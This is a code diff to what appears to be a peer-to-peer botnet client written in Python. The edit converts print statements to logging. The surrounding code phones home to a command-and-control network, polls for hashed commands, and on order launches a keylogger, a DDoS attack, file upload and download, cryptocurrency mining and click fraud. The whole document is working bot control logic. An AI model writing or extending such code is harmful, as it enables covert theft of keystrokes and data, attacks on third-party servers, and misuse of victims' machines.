@@ -80,7 +80,7 @@ async def get_cmd(value, sever, bot):
         cnt = len(args) # parse out the command count
         #cnt=len(args)
         cmd = args[0]
-        print("\nRUNNING CMD: {}\nCMD CNT: {}\nTotal CMDS:{}".format(cmd,cnt,bot._cmdcnt))
+        log.info("\nRUNNING CMD: {}\nCMD CNT: {}\nTotal CMDS:{}".format(cmd,cnt,bot._cmdcnt))
 
         # This eventually will automatically populate the commands to check 
         # Checks if the recieved hash from the commander matches one of the valid commands stored in bot. (see self._cmdsrun)
@@ -91,40 +91,40 @@ async def get_cmd(value, sever, bot):
             if cmd == get_hash('KEYLOG'):
                 if bot._cmdsrun['KEYLOG'] is False:
                     tmp = 'python keylogger.py {0}'.format(bot._cmdkey)
-                    print("Starting keylogger")
+                    log.info("Starting keylogger")
                     process = subprocess.Popen(tmp.split(), shell=False)
                     bot._pgroup.append(process)
                     bot._cmdsrun['KEYLOG'] = True
             if cmd == get_hash('DDOS'):
                 if bot._cmdsrun['DDOS'] is False:
                     tmp = 'python ddos.py {0}'.format(' '.join(args[1:]))
-                    print("Starting DDOS on {0}".format(tmp))
+                    log.info("Starting DDOS on {0}".format(tmp))
                     process = subprocess.Popen(tmp.split(), shell=False)
                     bot._cmdsrun['DDOS'] = True
             if cmd == get_hash('UPLOAD'):
                 tmp = 'python upload.py {0}'.format(' '.join(args[1:]))
-                print("Starting upload on {0}".format(tmp))
+                log.info("Starting upload on {0}".format(tmp))
                 process = subprocess.Popen(tmp.split(), shell=False)
             if cmd == get_hash('DOWNLOAD'):
                 tmp = 'python download.py {0}'.format(' '.join(args[1:]))
-                print("Starting DOWNLOAD on {0}".format(tmp))
+                log.info("Starting DOWNLOAD on {0}".format(tmp))
                 process = subprocess.Popen(tmp.split(), shell=False)
             if cmd == get_hash('BITCOIN'):
                 tmp = 'python mine.py {0}'.format(' '.join(args[1:]))
-                print("Starting BITCOING MINING on {0}".format(tmp))
+                log.info("Starting BITCOING MINING on {0}".format(tmp))
                 process = subprocess.Popen(tmp.split(), shell=False)
             if cmd == get_hash('CLICKFRAUD'):
                 tmp = 'python clickFraud.py {0}'.format(' '.join(args[1:]))
-                print("Starting CLICKFRAUD on {0}".format(tmp))
+                log.info("Starting CLICKFRAUD on {0}".format(tmp))
                 process = subprocess.Popen(tmp.split(), shell=False)
             if cmd == get_hash('HELLO'):
                 tmp = 'python sayHello.py {0}'.format(' '.join(args[1:]))
-                print("Starting Hello program on {0}".format(tmp))#log.info(msg)
+                log.info("Starting Hello program on {0}".format(tmp))#log.info(msg)
                 process = subprocess.Popen(tmp.split(),shell=False)
     except Exception as e:
         #log.error()
-        print("\nCaught Exception {}".format(e)) #log.error(msg)
-        print("We errored out trying to match command {} {}\n".format(type(cmd),cmd)) #log.error()
+        log.warning("\nCaught Exception {}".format(e)) #log.error(msg)
+        log.warning("We errored out trying to match command {} {}\n".format(type(value),value)) #log.error()
         pass
     # pdb.set_trace()
     # After running command set 
@@ -141,16 +141,16 @@ async def wait_cmd(server, bot):
     numcalls = 0
     checkCommands = await server.get(bot._cmdkey)
     while checkCommands is None: #and numcalls < 5: #set max calls to 5 for debugging 
-        print("\nNO COMMAND FOR ME WAITING")
+        log.info("\nNO COMMAND FOR ME WAITING")
         await asyncio.sleep(5)
         checkCommands = await server.get(bot._cmdkey)
         numcalls+=1
         #When the command is received get will return True and break out of the loop
         if checkCommands or numcalls > 5: #
-            print("Timed out waiting for command") 
+            log.warning("Timed out waiting for command") 
             break
     if checkCommands is not None: # You need the if statement hear, in the case in which the command times out, the code will not try to execute a non valid command.
-        print("\nFound a command\nCommand Hashed: {}\n".format(checkCommands))
+        log.info("\nFound a command\nCommand Hashed: {}\n".format(checkCommands))
         await asyncio.sleep(5)
         await get_cmd(checkCommands,server,bot)
             
@@ -171,7 +171,7 @@ async def callhome(server, bot):
         await asyncio.sleep(5)
         await callhome(server,bot)
     else:    
-        print("\nWe have an ack\nNode: {}\nJoined: {}\n"
+        log.info("\nWe have an ack\nNode: {}\nJoined: {}\n"
         .format(nodeId,NETKEY))
         #await wait_cmd(server,bot)
 
@@ -190,7 +190,7 @@ async def setup(server):
     #Create botnode with Its IP, Port, Bot ID, and command hash
     bot = botnode(myip, myport, str(server.node.long_id), cmdhash)
 
-    print("\nParams: NETWORK_KEY: {}\nIP: {}\nNODE_ID: {}\nCOMMAND KEY: {}"
+    log.info("\nParams: NETWORK_KEY: {}\nIP: {}\nNODE_ID: {}\nCOMMAND KEY: {}"
         .format(NETKEY, myip, server.node.long_id, cmdhash))
     #print("\nBOT CREATED?: CHECK THESE VARS:\n{}\n\n".format(vars(bot)))
     #pdb.set_trace()
@@ -206,8 +206,8 @@ async def bootstrapDone(server):
         loop.run_until_complete(server.bootstrap([(bootstrap_ip, bootstrap_port)]))
         server.stop()
         loop.close()
-        print("\nKey is: ",result, "\nBootstrapper down: machine has not joined network\n")
-    print("\nAble to fetch key as result:",result, type(result))
+        log.info("\nKey is: ",result, "\nBootstrapper down: machine has not joined network\n")
+    log.info("\nAble to fetch key as result:",result, type(result))
     return result
     
 
